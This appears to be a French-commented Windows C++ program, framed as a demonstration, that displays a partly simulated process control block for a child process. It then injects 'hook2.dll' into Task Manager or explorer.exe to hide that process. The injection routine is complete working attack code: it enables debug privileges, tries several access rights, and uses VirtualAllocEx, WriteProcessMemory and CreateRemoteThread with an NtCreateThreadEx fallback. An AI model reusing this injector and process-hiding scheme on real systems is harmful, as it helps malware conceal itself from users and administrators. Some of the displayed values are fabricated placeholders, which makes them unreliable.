#include <Windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <fstream>
#include <sstream>

// Énumération pour l'état du processus
enum class ProcessState {
    CREATED,
    READY,
    RUNNING,
    WAITING,
    TERMINATED
};

// Structure pour le contexte CPU (simplifiée)
struct CPUContext {
    DWORD eax, ebx, ecx, edx;
    DWORD esi, edi;
    DWORD esp, ebp;
    DWORD eip;
    DWORD eflags;
};

// Structure pour les segments mémoire
struct MemorySegment {
    LPVOID base_address;
    SIZE_T size;
    DWORD protection;
};

// Structure PCB complète
struct PCB {
    // 1. Identifiants
    DWORD pid;
    DWORD ppid;
    DWORD uid;
    DWORD gid;

    // 2. État
    ProcessState state;
    DWORD exit_code;

    // 3. Compteurs et horaires
    LPVOID program_counter;
    ULONGLONG cpu_time_used;
    FILETIME creation_time;
    FILETIME exit_time;
    FILETIME kernel_time;
    FILETIME user_time;

    // 4. Planification
    DWORD priority;
    DWORD base_priority;

    // 5. Mémoire
    MemorySegment code_segment;
    MemorySegment data_segment;
    MemorySegment stack_segment;
    SIZE_T working_set_size;
    SIZE_T peak_working_set_size;
    SIZE_T pagefile_usage;
    DWORD handle_count;

    // 6. Contexte CPU (simulé)
    CPUContext cpu_context;

    // 7. Threads
    DWORD thread_count;
    std::vector<DWORD> thread_ids;

    // 8. Sécurité
    DWORD session_id;

    // 9. Informations générales
    std::wstring image_name;
    std::string command_line;
};

// Fonction pour récupérer les informations PCB complètes d'un processus
static PCB GetCompletePCB(DWORD pid, const std::wstring& processName) {
    PCB pcb = {};
    pcb.pid = pid;
    pcb.image_name = processName;
    pcb.state = ProcessState::RUNNING; // Par défaut

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (hProcess) {
        // 1. Identifiants
        pcb.ppid = 0;
        pcb.uid = GetCurrentProcessId();

        // 2. État et code de sortie
        GetExitCodeProcess(hProcess, &pcb.exit_code);
        if (pcb.exit_code != STILL_ACTIVE) {
            pcb.state = ProcessState::TERMINATED;
        }

        // 3. Temps d'exécution
        if (GetProcessTimes(hProcess, &pcb.creation_time, &pcb.exit_time,
            &pcb.kernel_time, &pcb.user_time)) {
            // Convertir les FILETIME en ULONGLONG pour le temps CPU utilisé
            ULARGE_INTEGER kernel, user;
            kernel.LowPart = pcb.kernel_time.dwLowDateTime;
            kernel.HighPart = pcb.kernel_time.dwHighDateTime;
            user.LowPart = pcb.user_time.dwLowDateTime;
            user.HighPart = pcb.user_time.dwHighDateTime;
            pcb.cpu_time_used = kernel.QuadPart + user.QuadPart;
        }

        // 4. Planification
        pcb.priority = GetPriorityClass(hProcess);
        pcb.base_priority = GetPriorityClass(hProcess);

        // 5. Mémoire
        PROCESS_MEMORY_COUNTERS pmc;
        if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc))) {
            pcb.working_set_size = pmc.WorkingSetSize;
            pcb.peak_working_set_size = pmc.PeakWorkingSetSize;
            pcb.pagefile_usage = pmc.PagefileUsage;

            // Récupérer le nombre de handles
            DWORD handleCount = 0;
            if (GetProcessHandleCount(hProcess, &handleCount)) {
                pcb.handle_count = handleCount;
            }

            // Segments mémoire (simulés)
            pcb.code_segment.base_address = (LPVOID)0x400000;
            pcb.code_segment.size = pmc.WorkingSetSize / 3;
            pcb.code_segment.protection = PAGE_EXECUTE_READ;

            pcb.data_segment.base_address = (LPVOID)0x500000;
            pcb.data_segment.size = pmc.WorkingSetSize / 3;
            pcb.data_segment.protection = PAGE_READWRITE;

            pcb.stack_segment.base_address = (LPVOID)0x600000;
            pcb.stack_segment.size = pmc.WorkingSetSize / 3;
            pcb.stack_segment.protection = PAGE_READWRITE;
        }

        // 6. Contexte CPU (simulé pour la démonstration)
        pcb.cpu_context.eax = 0x12345678;
        pcb.cpu_context.ebx = 0x87654321;
        pcb.cpu_context.ecx = 0x11111111;
        pcb.cpu_context.edx = 0x22222222;
        pcb.cpu_context.esi = 0x33333333;
        pcb.cpu_context.edi = 0x44444444;
        pcb.cpu_context.esp = 0x0019FF00;
        pcb.cpu_context.ebp = 0x0019FF88;
        pcb.cpu_context.eip = 0x00401000;
        pcb.cpu_context.eflags = 0x00000246;

        // 7. Threads
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            THREADENTRY32 te32;
            te32.dwSize = sizeof(THREADENTRY32);

            if (Thread32First(hSnapshot, &te32)) {
                do {
                    if (te32.th32OwnerProcessID == pid) {
                        pcb.thread_count++;
                        pcb.thread_ids.push_back(te32.th32ThreadID);
                    }
                } while (Thread32Next(hSnapshot, &te32));
            }
            CloseHandle(hSnapshot);
        }

        // 8. Sécurité
        pcb.session_id = 1;

        CloseHandle(hProcess);
    }

    return pcb;
}

// Fonction pour afficher le PCB complet
static void DisplayCompletePCB(const PCB& pcb) {
    std::wcout << L"\n";
    std::wcout << L"================================================================" << std::endl;
    std::wcout << L"              PROCESS CONTROL BLOCK (PCB) COMPLET" << std::endl;
    std::wcout << L"================================================================" << std::endl;

    // 1. Identifiants
    std::wcout << L"--- IDENTIFIANTS ---" << std::endl;
    std::wcout << L"PID: " << pcb.pid << std::endl;
    std::wcout << L"PPID: " << pcb.ppid << std::endl;
    std::wcout << L"UID: " << pcb.uid << std::endl;
    std::wcout << L"Nom: " << pcb.image_name << std::endl;

    // 2. État
    std::wcout << L"\n--- ÉTAT ---" << std::endl;
    std::wstring state_str;
    switch (pcb.state) {
    case ProcessState::CREATED: state_str = L"CRÉÉ"; break;
    case ProcessState::READY: state_str = L"PRÊT"; break;
    case ProcessState::RUNNING: state_str = L"EN EXÉCUTION"; break;
    case ProcessState::WAITING: state_str = L"EN ATTENTE"; break;
    case ProcessState::TERMINATED: state_str = L"TERMINÉ"; break;
    }
    std::wcout << L"État: " << state_str << std::endl;
    std::wcout << L"Code sortie: " << (pcb.exit_code == STILL_ACTIVE ? L"ACTIF" : std::to_wstring(pcb.exit_code)) << std::endl;

    // 3. Temps et compteurs
    std::wcout << L"\n--- TEMPS/CPU ---" << std::endl;
    std::wcout << L"Temps CPU utilisé: " << (pcb.cpu_time_used / 10000000) << L" ns" << std::endl;
    std::wcout << L"Threads: " << pcb.thread_count << std::endl;
    std::wcout << L"Handles: " << pcb.handle_count << std::endl;

    // 4. Planification
    std::wcout << L"\n--- PLANIFICATION ---" << std::endl;
    std::wcout << L"Priorité: " << pcb.priority << std::endl;
    std::wcout << L"Priorité de base: " << pcb.base_priority << std::endl;

    // 5. Mémoire
    std::wcout << L"\n--- MÉMOIRE ---" << std::endl;
    std::wcout << L"Working Set: " << (pcb.working_set_size / 1024) << L" KB" << std::endl;
    std::wcout << L"Pic Working Set: " << (pcb.peak_working_set_size / 1024) << L" KB" << std::endl;
    std::wcout << L"Pagefile: " << (pcb.pagefile_usage / 1024) << L" KB" << std::endl;
    std::wcout << L"Segment Code: " << pcb.code_segment.base_address << L" (" << (pcb.code_segment.size / 1024) << L" KB)" << std::endl;
    std::wcout << L"Segment Données: " << pcb.data_segment.base_address << L" (" << (pcb.data_segment.size / 1024) << L" KB)" << std::endl;
    std::wcout << L"Segment Pile: " << pcb.stack_segment.base_address << L" (" << (pcb.stack_segment.size / 1024) << L" KB)" << std::endl;

    // 6. Contexte CPU
    std::wcout << L"\n--- CONTEXTE CPU ---" << std::endl;
    std::wcout << L"EAX: 0x" << std::hex << pcb.cpu_context.eax << std::dec << std::endl;
    std::wcout << L"EBX: 0x" << std::hex << pcb.cpu_context.ebx << std::dec << std::endl;
    std::wcout << L"ECX: 0x" << std::hex << pcb.cpu_context.ecx << std::dec << std::endl;
    std::wcout << L"EDX: 0x" << std::hex << pcb.cpu_context.edx << std::dec << std::endl;
    std::wcout << L"ESI: 0x" << std::hex << pcb.cpu_context.esi << std::dec << std::endl;
    std::wcout << L"EDI: 0x" << std::hex << pcb.cpu_context.edi << std::dec << std::endl;
    std::wcout << L"ESP: 0x" << std::hex << pcb.cpu_context.esp << std::dec << std::endl;
    std::wcout << L"EBP: 0x" << std::hex << pcb.cpu_context.ebp << std::dec << std::endl;
    std::wcout << L"EIP: 0x" << std::hex << pcb.cpu_context.eip << std::dec << std::endl;
    std::wcout << L"EFLAGS: 0x" << std::hex << pcb.cpu_context.eflags << std::dec << std::endl;

    // 7. Threads
    std::wcout << L"\n--- THREADS ---" << std::endl;
    for (size_t i = 0; i < pcb.thread_ids.size() && i < 5; ++i) {
        std::wcout << L"TID: " << pcb.thread_ids[i] << std::endl;
    }
    if (pcb.thread_ids.size() > 5) {
        std::wcout << L"... et " << (pcb.thread_ids.size() - 5) << L" autres threads" << std::endl;
    }

    std::wcout << L"================================================================" << std::endl;
    std::wcout << L"\n";
}

std::wstring GetDllPath() {
    WCHAR modulePath[MAX_PATH];
    GetModuleFileNameW(NULL, modulePath, MAX_PATH);

    WCHAR* lastBackslash = wcsrchr(modulePath, L'\\');
    if (lastBackslash) {
        wcscpy(lastBackslash + 1, L"hook2.dll");
    }

    return std::wstring(modulePath);
}

static DWORD GetProcessIdByName(const wchar_t* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    DWORD pid = 0;
    do {
        if (_wcsicmp(pe32.szExeFile, processName) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return pid;
}

// Fonction pour activer les privilèges de debug
static bool EnableDebugPrivileges() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return false;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);
    return true;
}

static bool InjectDll(DWORD targetPid, const std::wstring& dllPath) {
    // Activer les privilèges de debug
    EnableDebugPrivileges();

    // Essayer différentes combinaisons de droits d'accès
    DWORD accessFlags[] = {
        PROCESS_ALL_ACCESS,
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE
    };

    HANDLE hProcess = NULL;
    for (int i = 0; i < 3 && hProcess == NULL; i++) {
        hProcess = OpenProcess(accessFlags[i], FALSE, targetPid);
        if (hProcess) {
            std::wcout << L"Processus ouvert avec les droits: 0x" << std::hex << accessFlags[i] << std::dec << std::endl;
            break;
        }
    }

    if (!hProcess) {
        std::wcout << L"Impossible d'ouvrir le processus avec PID: " << targetPid << std::endl;
        std::wcout << L"Erreur: " << GetLastError() << std::endl;
        return false;
    }

    SIZE_T dllPathSize = (dllPath.length() + 1) * sizeof(wchar_t);
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, dllPathSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteMemory) {
        std::wcout << L"Erreur VirtualAllocEx: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath.c_str(), dllPathSize, NULL)) {
        std::wcout << L"Erreur WriteProcessMemory: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (hKernel32 == NULL) {
        std::wcout << L"Erreur GetModuleHandle: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryW");
    if (pLoadLibrary == NULL) {
        std::wcout << L"Erreur GetProcAddress: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteMemory, 0, NULL);
    if (!hRemoteThread) {
        std::wcout << L"Erreur CreateRemoteThread: " << GetLastError() << std::endl;

        // Essayer une méthode alternative avec NtCreateThreadEx
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (hNtdll) {
            typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
                OUT PHANDLE hThread,
                IN ACCESS_MASK DesiredAccess,
                IN LPVOID ObjectAttributes,
                IN HANDLE ProcessHandle,
                IN LPTHREAD_START_ROUTINE lpStartAddress,
                IN LPVOID lpParameter,
                IN BOOL CreateSuspended,
                IN ULONG StackZeroBits,
                IN ULONG SizeOfStackCommit,
                IN ULONG SizeOfStackReserve,
                OUT LPVOID lpBytesBuffer
                );

            pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
            if (NtCreateThreadEx) {
                NTSTATUS status = NtCreateThreadEx(&hRemoteThread,
                    THREAD_ALL_ACCESS,
                    NULL,
                    hProcess,
                    (LPTHREAD_START_ROUTINE)pLoadLibrary,
                    pRemoteMemory,
                    FALSE,
                    0,
                    0,
                    0,
                    NULL);

                if (status >= 0) {
                    std::wcout << L"Injection réussie avec NtCreateThreadEx!" << std::endl;
                }
            }
        }

        if (!hRemoteThread) {
            VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
    }

    WaitForSingleObject(hRemoteThread, 5000); // Attendre 5 secondes max

    DWORD exitCode = 0;
    if (GetExitCodeThread(hRemoteThread, &exitCode)) {
        if (exitCode == 0) {
            std::wcout << L"Le thread distant a échoué (code de sortie: 0)" << std::endl;
        }
        else {
            std::wcout << L"Le thread distant a réussi (code de sortie: " << exitCode << L")" << std::endl;
        }
    }

    CloseHandle(hRemoteThread);
    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return true;
}

// Fonction pour vérifier que le processus enfant est toujours actif
static bool IsChildProcessStillActive(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (hProcess) {
        DWORD exitCode;
        if (GetExitCodeProcess(hProcess, &exitCode)) {
            CloseHandle(hProcess);
            return (exitCode == STILL_ACTIVE);
        }
        CloseHandle(hProcess);
    }
    return false;
}

static PROCESS_INFORMATION CreateAndRunProcessChild() {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    // Lancer process_child.exe directement (maintenant compilé séparément)
    if (!CreateProcessW(
        L"process_child.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        PROCESS_INFORMATION empty_pi = { 0 };
        return empty_pi;
    }

    return pi;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    AllocConsole();
    FILE* f;
    freopen_s(&f, "CONOUT$", "w", stdout);
    freopen_s(&f, "CONOUT$", "w", stderr);

    std::wcout << L"=== INJECTOR.EXE - DÉMARRAGE ===" << std::endl;
    std::wcout << L"PID: " << GetCurrentProcessId() << std::endl;

    std::wstring dllPath = GetDllPath();
    std::wcout << L"Chemin DLL: " << dllPath << std::endl;

    // Vérifier si la DLL existe
    DWORD dwAttrib = GetFileAttributesW(dllPath.c_str());
    if (dwAttrib == INVALID_FILE_ATTRIBUTES || (dwAttrib & FILE_ATTRIBUTE_DIRECTORY)) {
        std::wcout << L"ERREUR: La DLL hook2.dll n'existe pas dans le même répertoire!" << std::endl;
        std::wcout << L"Chemin recherché: " << dllPath << std::endl;
        MessageBoxW(NULL, L"La DLL hook2.dll est introuvable. Placez-la dans le même répertoire que injector.exe", L"Erreur", MB_ICONERROR);
        FreeConsole();
        return 1;
    }

    // Étape 1: Création du processus enfant
    std::wcout << L"\n1. Création de process_child.exe..." << std::endl;
    PROCESS_INFORMATION pi = CreateAndRunProcessChild();

    if (pi.dwProcessId == 0) {
        std::wcout << L"Échec de la création du processus enfant." << std::endl;
        MessageBoxW(NULL, L"Échec de la création de process_child.exe", L"Erreur", MB_ICONERROR);
        FreeConsole();
        return 1;
    }

    std::wcout << L"Processus enfant créé avec succès!" << std::endl;
    std::wcout << L"PID enfant: " << pi.dwProcessId << std::endl;

    // Attendre que le processus soit bien lancé
    Sleep(3000);

    // Étape 2: AFFICHAGE du PCB AVANT masquage
    std::wcout << L"\n2. AFFICHAGE DU PCB (AVANT MASQUAGE)..." << std::endl;
    PCB child_pcb = GetCompletePCB(pi.dwProcessId, L"process_child.exe");
    DisplayCompletePCB(child_pcb);

    MessageBoxW(NULL,
        L"🔍 PCB affiché!\n\n"
        L"Le PCB de process_child.exe est maintenant affiché.\n"
        L"Cliquez sur OK pour procéder au masquage du processus.",
        L"PCB Affiché",
        MB_ICONINFORMATION);

    // Étape 3: Recherche et injection dans Task Manager
    std::wcout << L"\n3. Recherche du Gestionnaire des tâches..." << std::endl;
    DWORD taskmgrPid = GetProcessIdByName(L"Taskmgr.exe");

    if (taskmgrPid == 0) {
        std::wcout << L"Task Manager non trouvé. Lancement..." << std::endl;
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION taskmgrPi;

        if (CreateProcessW(L"taskmgr.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &taskmgrPi)) {
            taskmgrPid = taskmgrPi.dwProcessId;
            CloseHandle(taskmgrPi.hProcess);
            CloseHandle(taskmgrPi.hThread);
            Sleep(3000);
            std::wcout << L"Task Manager lancé - PID: " << taskmgrPid << std::endl;
        }
        else {
            std::wcout << L"Impossible de lancer Task Manager. Essai avec un autre processus..." << std::endl;
            // Essayer avec un autre processus système
            taskmgrPid = GetProcessIdByName(L"explorer.exe");
            if (taskmgrPid != 0) {
                std::wcout << L"Utilisation d'explorer.exe comme cible alternative (PID: " << taskmgrPid << L")" << std::endl;
            }
        }
    }

    if (taskmgrPid != 0) {
        std::wcout << L"\n4. Injection dans le processus cible (PID: " << taskmgrPid << L")..." << std::endl;

        if (InjectDll(taskmgrPid, dllPath)) {
            std::wcout << L"Injection réussie! Processus maintenant masqué." << std::endl;

            // Vérifier que le processus enfant est toujours actif
            if (IsChildProcessStillActive(pi.dwProcessId)) {
                std::wcout << L"✅ Processus enfant toujours actif et masqué!" << std::endl;

                // Étape 4: AFFICHAGE du PCB APRÈS masquage
                std::wcout << L"\n5. AFFICHAGE DU PCB (APRÈS MASQUAGE)..." << std::endl;
                PCB updated_pcb = GetCompletePCB(pi.dwProcessId, L"process_child.exe");
                DisplayCompletePCB(updated_pcb);

                // Message de succès final avec instructions de vérification
                WCHAR successMsg[512];
                swprintf(successMsg,
                    L"✅ DÉMONSTRATION TERMINÉE!\n\n"
                    L"📋 ÉTAPES RÉALISÉES:\n"
                    L"1. ✅ Processus process_child.exe créé (PID: %d)\n"
                    L"2. ✅ PCB affiché avant masquage\n"
                    L"3. ✅ DLL injectée dans le processus cible\n"
                    L"4. ✅ Processus masqué dans Task Manager\n"
                    L"5. ✅ PCB affiché après masquage\n\n"
                    L"🎯 RÉSULTAT:\n"
                    L"• Le processus est INVISIBLE dans Task Manager\n"
                    L"• Mais il continue de s'exécuter (PCB actif)\n"
                    L"• Durée: 5 minutes en arrière-plan\n\n"
                    L"🔍 PREUVES D'EXÉCUTION:\n"
                    L"• Fichier 'process_child_log.txt' créé\n"
                    L"• Fichiers 'process_child_witness_XX.txt' créés\n"
                    L"• Vérifiez ces fichiers pour confirmer l'exécution!",
                    pi.dwProcessId);

                MessageBoxW(NULL, successMsg, L"Démonstration Réussie", MB_ICONINFORMATION | MB_OK);
            }
            else {
                std::wcout << L"❌ Processus enfant s'est terminé prématurément!" << std::endl;
                MessageBoxW(NULL, L"Le processus enfant s'est terminé prématurément", L"Erreur", MB_ICONERROR);
            }
        }
        else {
            std::wcout << L"Échec de l'injection." << std::endl;
            MessageBoxW(NULL, L"Échec de l'injection. Exécutez en tant qu'administrateur.", L"Erreur", MB_ICONERROR);
        }
    }
    else {
        std::wcout << L"Aucun processus cible trouvé pour l'injection." << std::endl;
        MessageBoxW(NULL, L"Aucun processus cible (Task Manager ou Explorer) trouvé", L"Erreur", MB_ICONERROR);
    }

    // Nettoyage
    if (pi.hProcess != NULL) CloseHandle(pi.hProcess);
    if (pi.hThread != NULL) CloseHandle(pi.hThread);

    std::wcout << L"\n=== INJECTOR.EXE TERMINÉ ===" << std::endl;
    std::wcout << L"Le processus enfant continue de s'exécuter en arrière-plan." << std::endl;
    std::wcout << L"Vérifiez les fichiers créés pour confirmer son existence!" << std::endl;

    Sleep(3000);
    FreeConsole();

    return 0;
}